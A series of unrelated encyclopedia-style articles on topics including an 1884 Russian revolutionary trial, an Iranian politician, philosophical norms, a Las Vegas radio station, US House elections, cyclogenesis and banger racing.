<text>The Trial of the Fourteen (&quot;Процесс 14-ти&quot; in Russian) was a trial of fourteen members of Narodnaya Volya. It took place on September 24–28 (October 6–10), 1884 in Saint Petersburg&#x27;s district military court. Vera Figner - the last member of the Executive Committee of Narodnaya Volya to remain in Russia - was the principal defendant. Other members, including Nikolai Rogachev, Mikhail Ashenbrenner, Alexander Shtromberg, N.D.Pokhitonov, A.P.Tikhanovich, Ivan Yuvachev, Lyudmila Volkenstein and others - were also put on trial. They were all accused of taking part in terrorist activities of Narodnaya Volya. Prosecution used a testimony of Sergey Degayev, who had been an agent of the Okhrana. Vera Figner&#x27;s last words were printed abroad and distributed illegally in Russia. 

Two of the members of Narodnaya Volya were sentenced to death (Rogachev and Shtromberg), another five to eternal katorga, a further six to 15 to 20 years of katorga, and one of them to exile to Siberia.</text><links>

<text>Mohsen Mehralizadeh (; born September 30, 1956) is an Iranian reformist politician and former governor of Isfahan Province.
He was a vice president of Iran and the head of the National Sports Organization of Iran under President Khatami. He is an ethnic Azerbaijani.

Mehralizadeh was the governor of the Khorasan in Khatami&#x27;s first term of presidency. He is a candidate for the Iranian 2024 presidential election. 

==Presidential candidacy==

===2005 Iranian presidential election===
During the campaign for 2005 presidential election, Mehralizadeh announced his ambition for presidency on December 29 and said he was the candidate for the younger generation. He received some support from Majlis representatives of Guilan, Azerbaijan and Khorasan. On May 22, 2005, the Guardian Council rejected Mehralizadeh and Mostafa Moeen&#x27;s candidacy, but the next day they approved both reformist candidates after the controversial letter of Ayatollah Khamenei, the Supreme Leader of Iran, who specifically asked for their approval.

Mehralizadeh ranked last in the seven candidates running on June 17, 2005, securing about 1,300,000 votes (4.40%), a record number and percentage for a last finishing presidential candidate in Iran. He ranked first in the two provinces of the Iranian Azerbaijan.

===2021 Iranian presidential election===
Mohsen Mehralizadeh registered as a presidential candidate for 2021 presidential election in May 2021, and then subsequently was approved by Guardian Council. He was the only Reformist candidate among all other 6 candidates. He did withdraw from the competition two days before final election date.

<text>Norms are concepts (sentences) of practical import, oriented to affecting an action, rather than conceptual abstractions that describe, explain, and express. Normative sentences imply &quot;ought-to&quot; (or &quot;may&quot;, &quot;may not&quot;) types of statements and assertions, in distinction to sentences that provide &quot;is&quot; (or &quot;was&quot;, &quot;will&quot;) types of statements and assertions. Common normative sentences include commands, permissions, and prohibitions; common normative abstract concepts include &quot;sincerity&quot;, &quot;justification&quot;, and &quot;honesty&quot;. A popular account of norms describes them as reasons to take action, to believe, and to feel.

==Types of norms==
Orders and permissions express norms. Such norm sentences do not describe how the world &quot;is&quot;, they rather prescribe how the world &quot;should be&quot;. Imperative sentences are the most obvious way to express norms, but declarative sentences also may be norms, as is the case with laws or &#x27;principles&#x27;. Generally, whether an expression is a norm depends on what the sentence intends to assert. For instance, a sentence of the form &quot;All Ravens are Black&quot; could on one account be taken as descriptive, in which case an instance of a white raven would contradict it, or alternatively &quot;All Ravens are Black&quot; could be interpreted as a norm, in which case it stands as a principle and definition, so &#x27;a white raven&#x27; would then not be a raven.

Those norms purporting to create obligations (or duties) and permissions are called &quot;deontic norms&quot; (see also deontic logic). The concept of deontic norm is already an extension of a previous concept of norm, which would only include imperatives, that is, norms purporting to create duties. The understanding that permissions are norms in the same way was an important step in ethics and philosophy of law.

In addition to deontic norms, many other varieties have been identified. For instance, some constitutions establish the national anthem. These norms do not directly create any duty or permission. They create a &quot;national symbol&quot;. Other norms create nations themselves or political and administrative regions within a nation. The action orientation of such norms is less obvious than in the case of a command or permission, but is essential for understanding the relevance of issuing such norms: When a folk song becomes a &quot;national anthem&quot; the meaning of singing one and the same song changes; likewise, when a piece of land becomes an administrative region, this has legal consequences for many activities taking place on that territory; and without these consequences concerning action, the norms would be irrelevant. A more obviously action-oriented variety of such &quot;constitutive norms&quot; (as opposed to deontic or &quot;regulatory norms&quot;) establishes social institutions which give rise to new, previously nonexistent types of actions or activities (a standard example is the institution of marriage without which &quot;getting married&quot; would not be a feasible action; another is the rules constituting a game: without the norms of soccer, there would not exist such an action as executing an indirect free kick).

Any convention can create a norm, although the relation between both is not settled.

There is a significant discussion about (legal) norms that give someone the power to create other norms. They are called &quot;power-conferring norms&quot; or &quot;norms of competence&quot;. Some authors argue that they are still deontic norms, while others argue for a close connection between them and institutional facts (see Raz 1975, Ruiter 1993).

Linguistic conventions, for example, the convention in English that &quot;cat&quot; means cat or the convention in Portuguese that &quot;gato&quot; means cat, are among the most important norms.

Games completely depend on norms. The fundamental norm of many games is the norm establishing who wins and loses. In other games, it is the norm establishing how to score points.

Norms can be defined as rules that regulate one&#x27;s social life within a particular group. Within such, there can be explicit and implicit laws that help enforce norms. For example, explicit laws bring reward and punishment, such as cheating. Implicit cultural conventions include blocking the top of the stairs on a subway, doing your makeup on the train, or even walking slowly in the city. Norms can be described as injunctive social norms or descriptive social norms. Injunctive social norms are norms agreed upon mental representation of what a group of people think. An example of such can include being kind to your parents, or giving up the seat for a pregnant lady on the bus. These all showcase what some people feel should be done. Descriptive social norms on the other hand are norms agreed upon mental representations of what a group of people actually think or feel. An example of such can include drinking in public. Although we know it should not take place, on the back of our mind we know it happens. Another example can even include jaywalking. This shows that there are actual laws of what shouldn’t occur, yet it still does.

In society, there are many norms of reciprocity: door in the face, foot in the door, etc. One of the most common uses by people is door in the face. As human beings, we want to be liked by others and feel wanted. It is simply just human nature. This strategy uses reciprocating concessions to influence one&#x27;s behavior. This norm of reciprocity includes asking someone for something big, which we know the likelihood of the answer will be no. You would then ask them for something smaller and they would be more likely to say yes. For example, if I ask a group of people for 100$, they are not likely to give it to me. However, if I turn around again and ask for 5$, they are more likely to give it to me.

Many psychologists have done experiments to show the power of social learning and the influence it has on social norms to behavior. In 1961, Bandura studied to see if social behaviors can be gained from observation and imitation. 36 boys and 36 girls studied at the Stanford University Nursing School. Before the experiment was done, researchers wanted to see how aggressive they were on average on a scale of 1 to 5. Then, the overall 72 students were assigned to one of three groups. One group was assigned with the control group- no model, one group was assigned with an aggressive role model, and the other group was assigned with a non-aggressive role model. They then viewed a female model and a male model of each. The children were then placed independently into the room and were given aggressive/non-aggressive toys. The non-aggressive toys included a tea set, crayons, and three bears. The aggressive toys included a peg board, a dart gun, and a 3 foot bobo doll. The child was in the room for twenty minutes and was observed through a one way mirror. Observations were made every 5 seconds during the duration of 20 minutes. The researchers had found that children who had seen the aggressive model had aggressive responses compared to people that were in the non-aggression or control group. The boys were also more likely to imitate the behavior of the same sex models rather than the girls showing more violent behavior. The girls also acted more violently to the male models. These findings relate to norms as they show the influence of social norms on behavior. The young children were more likely to observe and copy the norms and be influenced by the behavior of others, especially those they may see as “older” or a “role model.”

In recent years, research has opened up on the hypothesis that non-human animals are also capable of acting according to norms. This thesis, supported by various philosophers and ethologists, is the subject of a current debate that is primarily based on the distinction between different possible concepts of ‘norm’.

==Major characteristics==
One major characteristic of norms is that, unlike propositions, they are not descriptively true or false, since norms do not purport to describe anything, but to prescribe, create or change something. Deontologists would denote them to be &quot;prescriptively true&quot; or false. Whereas the truth of a descriptive statement is purportedly based on its correspondence to reality, some philosophers, beginning with Aristotle, assert that the (prescriptive) truth of a prescriptive statement is based on its correspondence to right desire. Other philosophers maintain that norms are ultimately neither true or false, but only successful or unsuccessful (valid or invalid), as their propositional content obtains or not (see also John Searle and speech act).

There is an important difference between &quot;norms&quot; and &quot;normative propositions&quot;, although they are often expressed by identical sentences. &quot;You may go out&quot; usually expresses a norm if it is uttered by the teacher to one of the students, but it usually expresses a normative proposition if it is uttered to one of the students by one of his or her classmates. Some ethical theories reject that there can be normative propositions, but these are accepted by cognitivism. One can also think of propositional norms; assertions and questions arguably express propositional norms (they set a proposition as asserted or questioned).

Another purported feature of norms, it is often argued, is that they never regard only natural properties or . Norms always bring something artificial, conventional, institutional or &quot;unworldly&quot;. This might be related to Hume&#x27;s assertion that it is not possible to derive ought from is and to G.E. Moore&#x27;s claim that there is a naturalistic fallacy when one tries to analyse &quot;good&quot; and &quot;bad&quot; in terms of a natural concept. In aesthetics, it has also been argued that it is impossible to derive an aesthetical predicate from a non-aesthetical one. The acceptability of non-natural properties, however, is strongly debated in present-day philosophy. Some authors deny their existence, some others try to reduce them to natural ones, on which the former supervene.

Other thinkers (Adler, 1986) assert that norms can be natural in a different sense than that of &quot;corresponding to something proceeding from the object of the prescription as a strictly internal source of action&quot;. Rather, those who assert the existence of natural prescriptions say norms can suit a natural &quot;need&quot; on the part of the prescribed entity. More to the point, however, is the putting forward of the notion that just as descriptive statements being considered true are conditioned upon certain self-evident descriptive truths suiting the nature of reality (such as: it is impossible for the same thing to be and not be at the same time and in the same manner), a prescriptive truth can suit the nature of the will through the authority of it being based upon self-evident prescriptive truths (such as: one ought to desire what is really good for one and nothing else).

Recent works maintain that normativity has an important role in several different philosophical subjects, not only in ethics and philosophy of law (see Dancy, 2000).

<text>David R. Palmer (born 1941) is an American science fiction author. His works have been nominated three times for Hugo Awards.

==Biography==
Palmer was born at Chicago and studied at Highland Park High School. He is married and lives in Florida, where he had worked as a court reporter.

==Writing career==
Palmer&#x27;s first novel, &quot;Emergence&quot;, won the Compton Crook Award in 1985. It arose from a novella by the same title featured in the January 1981, issue of &quot;Analog&quot;. This was followed by the February 1983, &quot;Analog&quot; publication of the &quot;Seeking&quot; novella, which ultimately became part two of the novel. Thereafter the &quot;Emergence&quot; novella appeared in an anthology called &quot;Analog&#x27;s Children of the Future&quot;. Both novellas also won reader&#x27;s choice awards from &quot;Analog&quot;. Both were nominated for the Hugo Award for Best Novella in their respective years, and the novel for Best Novel in 1985.

A sequel to &quot;Emergence,&quot; &quot;Tracking,&quot; was serialized in three parts, beginning in the July/August 2008 issue of &quot;Analog&quot;. &quot;Tracking&quot; was continued in the September issue and concluded in the October issue of the magazine.

His second novel, &quot;Threshold&quot; (), was published as the first book in the &quot;To Halt Armageddon&quot; trilogy in 1985. The &quot;About the Author&quot; section of &quot;Threshold&quot; states that David is &quot;currently working on the sequel to &quot;Threshold&quot;, also to be published by Bantam&quot;, to be called &quot;Spēcial Education&quot;, which was eventually published in 2019 by Eric Flint&#x27;s Ring of Fire Press. He stated in the afterword to the 1990 edition of &quot;Emergence&quot; that any future writing would depend upon his finances.

Palmer has another completed but unpublished novel, &quot;Schrödinger&#x27;s Frisbee,&quot; which is not related to either of his first two novels. After sitting on his desk for almost 13 years, this book was finally released by Ring of Fire Press in 2021.

Wormhole Press had been indicated as a possible publisher for the new novels and for a reprinting of both &quot;Emergence&quot; and &quot;Threshold&quot;. The author had stated on Facebook (19 Dec 2014) that cover illustrations were in production and following that Wormhole Press will move into hardcover and e-book publication.

After his works being out of print and hard to find for over a decade, Palmer later made arrangements with Eric Flint&#x27;s Ring of Fire Press in 2018 to have his works reprinted starting with the reissue of &quot;Emergence&quot; in June 2018.

<doc id="1341379" wikidata="Q6328173" url="?curid=1341379" title="KDWN">
<text>KDWN (720 AM) was a commercial radio station in Las Vegas, Nevada, owned and operated by Audacy, Inc.. The station pronounced its call letters as &quot;K-Dawn&quot;. The station&#x27;s studios were located in the unincorporated Clark County area of Spring Valley. Programming was also heard on 250-watt FM translator station K268CS on 101.5 MHz.
KDWN aired a talk radio format. It ran several nationally syndicated conservative talk hosts, along with local shows, most of which were brokered programming. National hosts included Brian Kilmeade, Sean Hannity and Mark Levin. Other hours were devoted to money, health, real estate and sports. In most cases, the local hosts paid for their time on the air and were permitted to run their own advertising. Most hours on weekdays began with world and national news from Fox News Radio. A local staff provided Nevada news, weather and traffic. Weather coverage was supplied by NBC Network affiliate KSNV.

KDWN&#x27;s original 50,000-watt transmitter was on Galleria Drive in Henderson, and was nondirectional in the day and used three inline towers to produce a directional night signal nulled toward WGN on the same channel in Chicago. In 2020, it moved to a new site shared with KXST on North Sloan Lane in North Las Vegas. KDWN broadcast with 25,000 watts during daytime hours and 7,500 watts at night, still protecting WGN with an asymmetrical three-tower pattern. While the original nighttime signal could be heard throughout most of the Western United States, north into Canada and south into Mexico, the new signal had less coverage but was more economical, continuing to cover the local area using less spent power. KDWN also served as Southern Nevada&#x27;s primary entry point station for the Emergency Alert System.

KDWN broadcast, along with KXST, ceased operations on March 1, 2023. The station&#x27;s previous programming and branding continues to be heard on K268CS and KMXB-HD3.

==History==
===From music station to talk radio===
KDWN first came on the air on April 7, 1975. It was founded by A.J. Williams and Jack Reeder. Williams owned KTYM-AM-FM in Inglewood, California, and also owned television station KAIL in Fresno. Reeder was the chief engineer of KRLA in Los Angeles. Reeder died, leaving his half of the station to Williams, who owned the station until his death in 2005.

The station began by broadcasting a full service format of middle of the road music, news, sports and talk. The music format lasted longer on KDWN than on most AM radio stations of the day. In the 1970s, many AM stations were leaving music formats to FM, and switching over to talk programming. From 1978 to 1985, KDWN also was hosting sports talk at night, with &#x27;The Stardust Line&#x27; on Sunday nights. &#x27;The Stardust Line&#x27;, broadcasting from The Stardust Resort and Casino, was hosted by Lee Pete and NFL football great Jim Brown. For West Coast sports fans, KDWN was the first early source for betting lines and sports information from Nevada.

KDWN&#x27;s transition from music to talk began slowly. In the late 1970s, KDWN aired a mix of music and some talk during the day. In January 1980, KDWN began broadcasting talk around the clock. KDWN was the top news/talk outlet in the Las Vegas radio market and won an award for its coverage of the 1980 MGM Grand Fire.

Unlike most Las Vegas-area stations, KDWN remained locally owned, even as most of its competitors were bought out by large radio corporations such as Clear Channel Communications and Infinity Broadcasting. The continuity of ownership kept a consistent style of station sound. The station continued to rely on experienced, yet older, hosts who may have had been with the station since it began broadcasting in the talk radio format. The station did well in the ratings as one of the first generation of talk radio stations. Call screening was not used until recently.

===Art Bell and Rush Limbaugh===
Noted radio talk host Art Bell, after minor jobs at several California radio and TV stations, began hosting an all-night show on KDWN in 1983. KDWN had just been granted permission from the Federal Communications Commission to increase its nighttime power from 10,000 watts to 50,000 watts. KDWN was now audible with a good radio between nighttime and dawn in Los Angeles, San Francisco and around the West Coast. Bell called the show &quot;West Coast AM&quot; because it aired between 1 and 6 a.m. Pacific Time.

Bell began by discussing mostly politics. But he increasingly added discussions of the paranormal and conspiracy theories to the program, resulting in increased ratings and national attention. The show got nationwide syndication in 1993, when it was renamed &quot;Coast to Coast AM&quot;. Bell did the show from the Plaza Hotel, where KDWN had studios. Later it moved to a studio in his home in nearby Pahrump, Nevada, in Nye County. Eventually KDWN, no longer in control of the program, decided not to continue carrying it in syndication and it was picked up by rival Las Vegas talk station KXNT.

KDWN was one of the first radio stations to carry Rush Limbaugh&#x27;s nationally syndicated show in 1988. Limbaugh helped boost KDWN&#x27;s midday ratings. In 1996, with the rates to carry it increasing, KDWN decided not to renew the show. Like &quot;Coast to Coast AM&quot;, &quot;The Rush Limbaugh Show&quot; moved to KXNT. KDWN produced and broadcast a local morning show, &quot;The Snoozebusters&quot;, from the early 1980s until 2006. It was hosted by Ken Stahl and Hart Kirsch.

===Beasley Broadcasting acquisition, trade to Audacy===
In March 2006, Beasley Broadcast Group, a Naples, Florida–based company, announced plans to buy the station for $17 million. A Las Vegas newspaper reported a rumor that KDWN would change to an all-sports format, effective July 1, 2006, although the switch did not happen. Host Jim Dallas reported on &quot;Wake Up, America&quot; on July 21, 2006, that audience backlash against the change forced Beasley to retain the talk radio format.

In the fall of 2006, Beasley introduced a morning drive time news and information show hosted by Heidi Harris, with the remainder of its weekday talk format consisting of nationally syndicated shows and local brokered programming. Harris&#x27; show was discontinued in 2012, with the nationally syndicated Laura Ingraham show moved into the morning time slot which was later discontinued. Harris had also been heard on KDWN from 1988 to 1998.

In June 2017, the Oakland Raiders, in preparation for their relocation to Las Vegas, announced that a two–year deal had been reached with the Beasley Broadcast Group to carry Raiders games on KDWN and FM sister station KCYE, starting with the 2017 NFL season. In 2019, the team moved their broadcasts to KYMT.

On October 6, 2022, Beasley Broadcasting announced a station swap with Audacy, Inc., wherein Beasley would swap ownership of KDWN to Audacy in exchange for ownership of KXTE.

===End of transmission===
On February 13, 2023, Audacy announced that KDWN would be signing off on March 1, while the translator would remain on air with the same programming. In November 2022, Audacy sold the land that the AM transmitter sat on for $40 million. KDWN was diplexed with KXST near the Las Vegas Motor Speedway; on the same day, Audacy also announced that KXST would also go dark.

With the station signing off, KXNT replaced KDWN as the primary entry point in Southern Nevada for the Emergency Alert System. KDWN&#x27;s programming remains available on K268CS (101.5 FM), which is fed via KMXB-HD3.

On March 1, 2023, at midnight, following the station&#x27;s broadcast of Audacy-based podcast &quot;Perilous World Radio&quot;, the station gave a final message redirecting listeners to the FM signal or Audacy app, then played the state anthem, &quot;Home Means Nevada&quot;, as sung by The Killers (a live recording from October 19, 2010), then a station ID before concluding with the Star-Spangled Banner as performed by Alabama, a picture of the transmitter sites transmitted using slow scan television, and a series of Q code messages ending with &quot;KDWN QRT&quot;, the latter portion the Q code signal to end transmission. KDWN remained on the air with a dead air transmission in anticipation of a final additional DX test scheduled for March 2, prior to the station&#x27;s final sign off at midnight on March 2, 2023.

On September 21, 2023, KDWN and sister station KXST filed applications with the FCC to relocate the two stations&#x27; towers and return to the air. No exact timeline was given. The stations did not return to the air within a year of shutting down; on March 11, 2024, Audacy submitted an application to cancel the license.

The Federal Communications Commission cancelled the station’s license on March 22, 2024 because it had been silent for more than twelve consecutive months.

<text>WAMH (89.3 FM) is a radio station occasionally broadcasting an alternative rock format. It is licensed to Amherst, Massachusetts, United States, and the station is owned by Amherst College. Programming has included independent artists, news, college sports, and live local music. Since September 2015, when the college is in session the station splits broadcast time between student programming from 4:00 p.m. to 2:00 a.m. and a relay of NEPR News Network broadcasting at other hours.

The station is federally licensed (authorized by the FCC) and non-commercial, and is under the supervision of the Amherst College Board of Trustees.

WAMH broadcasts from an antenna adjacent to the WFCR tower on Mount Lincoln in Pelham, Massachusetts. Nielsen Broadcast Data Systems ratings as of January 2018 found that over 3,500 listeners tune in to WAMH during the 10 hours of student programming each day.
The station originally used the call sign WAMF; it became WAMH on March 22, 1971.

<text>The 2002 United States House of Representatives elections were held on November 5, 2002, in the middle of President George W. Bush&#x27;s first term, to elect U.S. Representatives to serve in the 108th United States Congress. This was the first congressional election using districts drawn up during the 2000 United States redistricting cycle on the basis of the 2000 census.

Although it was a midterm election under a Republican president, the Republican Party made a net gain of eight seats, giving the party their largest majority since 1995. This was one of three midterm elections since World War Two in which the president&#x27;s party did not experience a net loss of seats in either the House or the Senate (the other such midterm elections were in 1998 and 2022). Some speculate that this may have been due to increased support for the president&#x27;s party in the wake of the September 11 attacks. As of 2024 it is the most recent midterm election in which the president&#x27;s party did not lose control of the House.

<text>Cyclogenesis is the development or strengthening of cyclonic circulation in the atmosphere (a low-pressure area). Cyclogenesis is an umbrella term for at least three different processes, all of which result in the development of some sort of cyclone, and at any size from the microscale to the synoptic scale.

* Tropical cyclones form due to latent heat driven by significant thunderstorm activity, developing a warm core.
* Extratropical cyclones form as waves along weather fronts before occluding later in their life cycle as cold core cyclones.
* Mesocyclones form as warm core cyclones over land, and can lead to tornado formation. Waterspouts can also form from mesocyclones, but more often develop from environments of high instability and low vertical wind shear.

The process in which an extratropical cyclone undergoes a rapid drop in atmospheric pressure (24 millibars or more) in a 24-hour period is referred to as explosive cyclogenesis, and is usually present during the formation of a nor&#x27;easter. Similarly, a tropical cyclone can undergo rapid intensification.

The anticyclonic equivalent, the process of formation of high-pressure areas, is anticyclogenesis. The opposite of cyclogenesis is cyclolysis.

== Meteorological scales ==
There are four main scales, or sizes of systems, dealt with in meteorology: the macroscale, the synoptic scale, the mesoscale, and the microscale. The macroscale deals with systems with global size, such as the Madden–Julian oscillation. Synoptic scale systems cover a portion of a continent, such as extratropical cyclones, with dimensions of across. The mesoscale is the next smaller scale, and often is divided into two ranges: meso-alpha phenomena range from across (the realm of the tropical cyclone), while meso-beta phenomena range from across (the scale of the mesocyclone). The microscale is the smallest of the meteorological scales, with a size under (the scale of tornadoes and waterspouts). These horizontal dimensions are not rigid divisions but instead reflect typical sizes of phenomena having certain dynamic characteristics. For example, a system does not necessarily transition from meso-alpha to synoptic scale when its horizontal extent grows from .

== Extratropical cyclones ==

=== Norwegian cyclone model ===
The Norwegian cyclone model is an idealized formation model of cold-core cyclonic storms developed by Norwegian meteorologists during the First World War. The main concept behind this model, relating to cyclogenesis, is that cyclones progress through a predictable evolution as they move up a frontal boundary, with the most mature cyclone near the northeast end of the front and the least mature near the tail end of the front.

=== Precursors for development ===
A preexisting frontal boundary, as defined in surface weather analysis, is required for the development of a mid-latitude cyclone. The cyclonic flow begins around a disturbed section of the stationary front due to an upper level disturbance, such as a short wave or an upper-level trough, near a favorable quadrant of the upper-level jet. However, enhanced along-frontal stretching rates in the lower troposphere can suppress the growth of extratropical cyclones.

=== Vertical motion affecting development ===

Cyclogenesis can only occur when temperature decreases polewards (to the north, in the northern hemisphere), and pressure perturbation lines tilt westward with height. Cyclogenesis is most likely to occur in regions of cyclonic vorticity advection, downstream of a strong westerly jet. The combination of vorticity advection and thermal advection created by the temperature gradient and a low pressure center cause upward motion around the low.

If the temperature gradient is strong enough, temperature advection will increase, driving more vertical motion. This increases the overall strength of the system. Shearwise updrafts are the most important factor in determining cyclonic growth and strength.

=== Modes of development ===
A surface low can have a variety of causes for forming. Topography can force a surface low to form when an existing baroclinic wave moves over a mountain barrier; this is known as &quot;lee cyclogenesis&quot; since the low forms on the leeward side of the mountains. Mesoscale convective systems can spawn surface lows which are initially warm core. The disturbance can grow into a wave-like formation along the front and the low will be positioned at the crest. Around the low, flow will become cyclonic, by definition. This rotational flow will push polar air equator-ward west of the low via its trailing cold front, and warmer air will push poleward low via the warm front. Usually the cold front will move at a quicker pace than the warm front and &quot;catch up&quot; with it due to the slow erosion of higher density airmass located out ahead of the cyclone and the higher density airmass sweeping in behind the cyclone, usually resulting in a narrowing warm sector. At this point an occluded front forms where the warm air mass is pushed upwards into a trough of warm air aloft, which is also known as a trowal (a trough of warm air aloft). All developing low-pressure areas share one important aspect, that of upward vertical motion within the troposphere. Such upward motions decrease the mass of local atmospheric columns of air, which lower surface pressure.

=== Maturity ===
Maturity is after the time of occlusion when the storm has completed strengthening and the cyclonic flow is at its most intense. Thereafter, the strength of the storm diminishes as the cyclone couples with the upper-level trough or upper-level low, becoming increasingly cold core. The spin-down of cyclones, also known as cyclolysis, can be understood from an energetics perspective. As occlusion occurs and the warm air mass is pushed upwards over a cold air airmass, the atmosphere becomes increasingly stable and the centre of gravity of the system lowers. As the occlusion process extends further down the warm front and away from the central low, more and more of the available potential energy of the system is exhausted. This potential energy sink creates a kinetic energy source which injects a final burst of energy into the storm&#x27;s motions. After this process occurs, the growth period of the cyclone, or cyclogenesis, ends, and the low begins to spin down (fill) as more air is converging into the bottom of the cyclone than is being removed out the top since upper-level divergence has decreased.

Occasionally, cyclogenesis will re-occur with occluded cyclones. When this happens a new low center will form on the triple-point (the point where the cold front, warm front, and occluded front meet). During triple-point cyclogenesis, the occluded parent low will fill as the secondary low deepens into the main weathermaker.

== Tropical cyclones ==
Tropical cyclones exist within a mesoscale alpha domain. As opposed to mid-latitude cyclogenesis, tropical cyclogenesis is driven by strong convection organised into a central core with no baroclinic zones, or fronts, extending through their center. Although the formation of tropical cyclones is the topic of extensive ongoing research and is still not fully understood, there are six main requirements for tropical cyclogenesis: sea surface temperatures that are warm enough, atmospheric instability, high humidity in lower to middle levels of the troposphere, enough Coriolis force to develop a low pressure center, a pre-existing low level focus or disturbance, and low vertical wind shear. These warm core cyclones tend to form over the oceans between 10 and 30 degrees of the equator.

== Mesocyclones ==
Mesocyclones range in size from mesoscale beta to microscale. The term mesocyclone is usually reserved for mid-level rotations within severe thunderstorms, and are warm core cyclones driven by latent heat of its associated thunderstorm activity.

Tornadoes form in the warm sector of extratropical cyclones where a strong upper-level jet stream exists. Mesocyclones are believed to form when strong changes of wind speed and/or direction with height (&quot;wind shear&quot;) sets parts of the lower part of the atmosphere spinning in invisible tube-like rolls. The convective updraft of a thunderstorm is then thought to draw up this spinning air, tilting the rolls&#x27; orientation upward (from parallel to the ground to perpendicular) and causing the entire updraft to rotate as a vertical column.

As the updraft rotates, it may form what is known as a wall cloud. The wall cloud is a spinning layer of clouds descending from the mesocyclone. The wall cloud tends to form closer to the center of the mesocyclone. The wall clouds do not necessarily need a mesocyclone to form and do not always rotate. As the wall cloud descends, a funnel-shaped cloud may form at its center. This is the first stage of tornado formation. The presence of a mesocyclone is believed to be a key factor in the formation of the strong tornadoes associated with severe thunderstorms.

== Tornadoes ==
Tornadoes exist on the microscale or low end of the mesoscale gamma domain. The cycle begins when a strong thunderstorm develops a rotating mesocyclone a few miles up in the atmosphere, becoming a supercell. As rainfall in the storm increases, it drags with it an area of quickly descending air known as the rear flank downdraft (RFD). This downdraft accelerates as it approaches the ground, and drags the rotating mesocyclone towards the ground with it.

As the mesocyclone approaches the ground, a visible condensation funnel appears to descend from the base of the storm, often from a rotating wall cloud. As the funnel descends, the RFD also reaches the ground, creating a gust front that can cause damage a good distance from the tornado. Usually, the funnel cloud begins causing damage on the ground (becoming a tornado) within minutes of the RFD reaching the ground.

== Waterspouts ==
Waterspouts exist on the microscale. While some waterspouts are strong (tornadic) like their land-based counterparts, most are much weaker and caused by different atmospheric dynamics. They normally develop in moisture-laden environments with little vertical wind shear along lines of convergence, such as land breezes, lines of frictional convergence from nearby landmasses, or surface troughs. Their parent cloud can be as innocuous as a moderate cumulus, or as significant as a thunderstorm. Waterspouts normally develop as their parent clouds are in the process of development, and it is theorized that they spin up as they move up the surface boundary from the horizontal wind shear near the surface, and then stretch upwards to the cloud once the low level shear vortex aligns with a developing cumulus or thunderstorm. Weak tornadoes, known as landspouts, across eastern Colorado have been witnessed to develop in a similar manner. An outbreak occurred in the Great Lakes in late September and early October 2003 along a lake effect band. September is the peak month of landspout and waterspout occurrence around Florida and for waterspout occurrence around the Great Lakes.

== Related terms ==
Cyclogenesis is the opposite of cyclolysis, which concerns the weakening of surface cyclones. The term has an anticyclonic (high-pressure system) equivalent—Anticyclogenesis, which deals with the formation of surface high-pressure systems.

<text>The 2000 United States House of Representatives elections were held on November 7, 2000, to elect U.S. Representatives to serve in the 107th United States Congress. They coincided with the election of George W. Bush as President of the United States. The Republican Party won 221 seats, while the Democratic Party won 212 and independents won two.

This marked the first time since 1992 that the victorious presidential party lost seats in the House, and the first since 1988 that they lost seats in both Houses. This resulted in the smallest Republican majority since 1952, which would similarly occur in 2022.

<text>Illinois Route 351 is a north–south state route that leads from Illinois Route 71 and Illinois Route 251 by Oglesby through downtown LaSalle to Interstate 80. It is long.

== Route description ==

Illinois 351 is the former Business U.S. Route 51 through La Salle. It crosses over the Illinois River on the Shippingsport Bridge south of La Salle and passes underneath the Abraham Lincoln Memorial Bridge as it climbs out of the Illinois River Valley. Like Illinois Route 251, Illinois 351 can be considered a spur off its parent, U.S. Route 51.

== History ==
Prior to 1963, US 51 originally traveled mostly along present-day IL 351. From 1963 to 1966, it became US 51 Business (US 51 Bus.) as US 51 was rerouted west of LaSalle along present-day Illinois Route 251. After 1966, it was then changed to IL 351.

<text>Banger racing is a tarmac, dirt, shale and chalk track type of motorsport event popular in countries such as the United Kingdom, Ireland, Belgium and the Netherlands. Vehicles are raced against one another, with the winner being the first to the checkered flag after a set number of laps. Contact to damage an opponent&#x27;s car is permitted and encouraged within the formula, with cars progressively becoming more damaged throughout an event. Races are held at an oval or tri-oval circuits that are up to long; however, on certain occasions, races are held in a figure of eight configurations. Banger racing is often confused with stock car racing, although there are differences between the two, despite often racing at the same tracks.

==Vehicles==
Banger racing vehicles are normally scrap or &#x27;written-off&#x27; cars in varying states of disrepair. In modern bangers, there are different events held for different vehicle types.

The most common type are &#x27;Unlimited&#x27; bangers, where cars racing have no set engine size limit. Despite the high running costs, this is usually one of the most competitive classes and is favoured by most drivers because of the high speeds and car strengths. Fans often regard the unlimited class as the sport&#x27;s pinnacle, with many big championship races being raced to unlimited class specs.

The &#x27;Under 2000cc&#x27; class is where cars have to have an engine under two litres in size, a formula that proves to be particularly popular with Ford variant cars such as the Mondeo and the Cougar. As these types of cars are used so often, some promotions have taken to limiting the &#x27;Under 2000cc&#x27; class even more, by running races with additional car constraints that force drivers to use alternative vehicles to the favoured Fords.

&#x27;Under 1300cc-1800cc&#x27;, also known as &#x27;Domestic bangers&#x27;, are another regular class of bangers seen in the UK, with the engine displacement cap varying on the track or promotion that is holding the event. The domestic class is most common in the &#x27;Rookie&#x27; and &#x27;Back to Basic&#x27; formats.

&#x27;Micros&#x27; are the smallest vehicle class used in the banger racing and usually feature cars such as the Ford Ka and the Nissan Micra, that are generally considered to be too small or uncompetitive to compete in the other classes. Micros have quickly become one of the most popular forms of banger racing, due to the cheap running and repair costs of the cars compared with the bigger machinery.

Four-wheel drive cars cannot be raced in any of the above categories. The &#x27;Unlimited&#x27; class has the main stipulation of the car being rear-wheel drive, unless the vehicle is of American origin. This ruling makes it quite flexible for drivers to choose an appropriate car to race in, however there are some car models which have been banned outright for their increased strength compared to other vehicles. This is mainly to keep competition fair and not to endanger drivers who may be racing in weaker cars. The SsangYong Rodius and the Chrysler Imperial are two of the most prominent to have been banned for these reasons.

Many other banger classes exist, but many are only applied for special event meetings. Big or small van, HGV/coach/bus, 4X4/SUV, siamese/double-decker and classic car (&#x27;Pre&#x27; meeting) bangers are all classes that would incorporate vehicles one may not normally be allowed to race in the regular disciplines listed above.

==History and turnouts==

Banger racing is said to have started in the early 1960s after it was observed by a race promoter that crashes were among the most popular features of a race meeting. Drivers began turning out vehicles with very basic preparation - cars would have the windows removed but often whole interiors would be left inside. Safety regulations began to improve in the 1980s with bangers being prepared with compulsory &#x27;H frame&#x27; roll cages, driver&#x27;s door plates, and fuel tanks moved inside the car.

